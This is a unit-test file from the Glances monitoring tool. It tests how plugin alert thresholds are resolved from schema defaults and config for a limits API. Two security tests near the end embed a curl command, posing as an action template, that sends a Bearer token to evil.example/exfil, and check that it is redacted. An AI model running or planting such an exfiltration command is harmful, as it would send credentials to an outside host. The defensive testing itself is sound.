#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2026 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Unit tests for ``GlancesPluginBase.get_limits()``.

``get_limits()`` is the single source of truth behind both the REST
``/api/5/<plugin>/limits`` route and the MCP ``glances://limits``
resource. It returns *effective* thresholds — the plugin's config
section layered over each field's ``default_thresholds``.

See docs/superpowers/specs/2026-08-03-glances-v5-limits-routes-design.md
"""

from __future__ import annotations

import asyncio
import json
from typing import Any, ClassVar

from glances.plugins.plugin.base_v5 import GlancesPluginBase


class _LimitsScalar(GlancesPluginBase[dict]):
    """Scalar plugin: one watched numeric field, one unwatched field."""

    plugin_name: ClassVar[str] = "limitsscalar"
    IS_COLLECTION: ClassVar[bool] = False
    fields_description: ClassVar[dict[str, dict[str, Any]]] = {
        "percent": {
            "description": "Usage percentage.",
            "unit": "percent",
            "watched": True,
            "watch_direction": "high",
            "default_thresholds": {"careful": 50.0, "warning": 70.0, "critical": 90.0},
        },
        "total": {"description": "Total.", "unit": "bytes"},
    }

    async def _grab_stats(self) -> dict:
        return {"percent": 42.0, "total": 1024}


class _LimitsThresholdField(GlancesPluginBase[dict]):
    """Field whose config-key prefix differs from its field name."""

    plugin_name: ClassVar[str] = "limitstf"
    IS_COLLECTION: ClassVar[bool] = False
    fields_description: ClassVar[dict[str, dict[str, Any]]] = {
        "cpu_percent": {
            "description": "CPU usage.",
            "unit": "percent",
            "watched": True,
            "watch_direction": "high",
            "threshold_field": "cpu",
            "default_thresholds": {"careful": 50.0, "warning": 70.0},
        },
    }

    async def _grab_stats(self) -> dict:
        return {"cpu_percent": 10.0}


class _LimitsCategorical(GlancesPluginBase[dict]):
    """Categorical watched field — opt-in, no schema defaults."""

    plugin_name: ClassVar[str] = "limitscat"
    IS_COLLECTION: ClassVar[bool] = False
    fields_description: ClassVar[dict[str, dict[str, Any]]] = {
        "status": {
            "description": "Process status.",
            "unit": "string",
            "watched": True,
            "threshold_type": "categorical",
            "prominent": False,
        },
    }

    async def _grab_stats(self) -> dict:
        return {"status": "S"}


class _LimitsUnwatched(GlancesPluginBase[dict]):
    """No watched field at all — e.g. the `now` / `version` plugins."""

    plugin_name: ClassVar[str] = "limitsunwatched"
    IS_COLLECTION: ClassVar[bool] = False
    fields_description: ClassVar[dict[str, dict[str, Any]]] = {
        "value": {"description": "A value.", "unit": "string"},
    }

    async def _grab_stats(self) -> dict:
        return {"value": "x"}


def test_get_limits_falls_back_to_schema_defaults(store_with, config_with):
    plugin = _LimitsScalar(store_with(), config_with({}))
    assert plugin.get_limits() == {"percent": {"careful": 50.0, "warning": 70.0, "critical": 90.0}}


def test_get_limits_layers_config_over_defaults_per_level(store_with, config_with):
    config = config_with({"limitsscalar": {"percent_warning": "42"}})
    plugin = _LimitsScalar(store_with(), config)
    limits = plugin.get_limits()
    assert limits["percent"]["warning"] == 42.0
    # The levels the operator did NOT override keep their schema default.
    assert limits["percent"]["careful"] == 50.0
    assert limits["percent"]["critical"] == 90.0


def test_get_limits_omits_unwatched_fields(store_with, config_with):
    plugin = _LimitsScalar(store_with(), config_with({}))
    assert "total" not in plugin.get_limits()


def test_get_limits_reads_by_threshold_field_but_keys_by_field_name(store_with, config_with):
    config = config_with({"limitstf": {"cpu_warning": "33"}})
    plugin = _LimitsThresholdField(store_with(), config)
    limits = plugin.get_limits()
    assert "cpu_percent" in limits
    assert "cpu" not in limits
    assert limits["cpu_percent"]["warning"] == 33.0
    assert limits["cpu_percent"]["careful"] == 50.0


def test_get_limits_empty_when_no_watched_field(store_with, config_with):
    plugin = _LimitsUnwatched(store_with(), config_with({}))
    assert plugin.get_limits() == {}


def test_get_limits_groups_categorical_under_underscore_key(store_with, config_with):
    config = config_with({"limitscat": {"status_ok": "S,R,I", "status_critical": "Z,D"}})
    plugin = _LimitsCategorical(store_with(), config)
    limits = plugin.get_limits()
    assert limits["_categorical"] == {"status": {"ok": ["I", "R", "S"], "critical": ["D", "Z"]}}
    # `status` must NOT also appear at the top level (that space is numeric).
    assert "status" not in limits


def test_get_limits_categorical_is_json_serialisable(store_with, config_with):
    config = config_with({"limitscat": {"status_ok": "S,R"}})
    plugin = _LimitsCategorical(store_with(), config)
    # read_thresholds_categorical returns sets; unconverted they raise here.
    json.dumps(plugin.get_limits())


def test_get_limits_omits_categorical_key_when_unconfigured(store_with, config_with):
    plugin = _LimitsCategorical(store_with(), config_with({}))
    assert plugin.get_limits() == {}


class _LimitsCollection(GlancesPluginBase[list]):
    """Collection plugin with a per-item-overridable numeric field."""

    plugin_name: ClassVar[str] = "limitscoll"
    IS_COLLECTION: ClassVar[bool] = True
    fields_description: ClassVar[dict[str, dict[str, Any]]] = {
        "interface_name": {"description": "Name.", "unit": "string", "primary_key": True},
        "rx": {
            "description": "Received bytes.",
            "unit": "bytes",
            "watched": True,
            "watch_direction": "high",
            "default_thresholds": {"careful": 70.0, "warning": 80.0},
        },
    }

    async def _grab_stats(self) -> list:
        return [{"interface_name": "eth0", "rx": 10}, {"interface_name": "wlan0", "rx": 20}]


def test_per_item_absent_when_no_override_configured(store_with, config_with):
    store = store_with()
    plugin = _LimitsCollection(store, config_with({}))
    asyncio.run(plugin.update())
    assert "_per_item" not in plugin.get_limits()


def test_per_item_reports_override_for_an_item_in_the_store(store_with, config_with):
    config = config_with({"limitscoll": {"wlan0_rx_warning": "60"}})
    store = store_with()
    plugin = _LimitsCollection(store, config)
    asyncio.run(plugin.update())
    limits = plugin.get_limits()
    # Plugin-level view is unchanged and still pk-agnostic.
    assert limits["rx"] == {"careful": 70.0, "warning": 80.0}
    # Only the overridden item appears, carrying the layered result.
    assert limits["_per_item"] == {"wlan0": {"rx": {"careful": 70.0, "warning": 60.0}}}


def test_per_item_skips_items_absent_from_the_store(store_with, config_with):
    """Documented limitation (design §4.3): an override configured for an
    item that is not currently present is not reported."""
    config = config_with({"limitscoll": {"ppp0_rx_warning": "60"}})
    store = store_with()
    plugin = _LimitsCollection(store, config)
    asyncio.run(plugin.update())
    assert "_per_item" not in plugin.get_limits()


def test_per_item_never_present_on_a_scalar_plugin(store_with, config_with):
    config = config_with({"limitsscalar": {"percent_warning": "42"}})
    store = store_with()
    plugin = _LimitsScalar(store, config)
    asyncio.run(plugin.update())
    assert "_per_item" not in plugin.get_limits()


# ------------------------------------------------- security invariant (§7)
#
# `get_limits()` may only ever expose field names, level names, and the
# *values* of config keys shaped `<field>_<level>` / `<pk>_<field>_<level>`
# / `<level>`. A config section carries other kinds of keys too — action
# command templates (which can embed credentials), `disable`, `refresh`,
# `*_log` — and none of those, nor their values, may leak into the payload.
# This is the v4 bug (unredacted `*_action` templates) the design exists to
# avoid; the key space read must stay closed and code-controlled.


def test_get_limits_never_leaks_action_or_control_keys_or_values(store_with, config_with):
    # Deliberately low-entropy marker: a realistic-looking token trips the
    # gitleaks `generic-api-key` rule in pre-commit. What the test needs is a
    # string unique enough to be traceable, not one shaped like a credential.
    canary = "CANARY-PLUGIN-MUST-NOT-LEAK"
    config = config_with(
        {
            "limitsscalar": {
                "percent_warning": "42",
                "percent_critical_action": f"curl -H 'Authorization: Bearer {canary}' https://evil.example/exfil",
                "disable": "True",
                "refresh": "5",
                "percent_log": "True",
            }
        }
    )
    plugin = _LimitsScalar(store_with(), config)
    limits = plugin.get_limits()

    # The legitimate threshold is still resolved.
    assert limits["percent"]["warning"] == 42.0

    payload = json.dumps(limits)
    for leaked in ("action", "disable", "refresh", "_log", canary, "evil.example"):
        assert leaked not in payload


def test_per_item_limits_never_leak_the_action_value(store_with, config_with):
    canary = "CANARY-PER-ITEM-MUST-NOT-LEAK"
    config = config_with(
        {
            "limitscoll": {
                "wlan0_rx_warning": "60",
                "wlan0_rx_critical_action": f"curl -H 'Authorization: Bearer {canary}' https://evil.example/exfil",
                "wlan0_rx_log": "True",
            }
        }
    )
    store = store_with()
    plugin = _LimitsCollection(store, config)
    asyncio.run(plugin.update())
    limits = plugin.get_limits()

    assert limits["_per_item"] == {"wlan0": {"rx": {"careful": 70.0, "warning": 60.0}}}

    payload = json.dumps(limits)
    for leaked in ("action", "_log", canary, "evil.example"):
        assert leaked not in payload
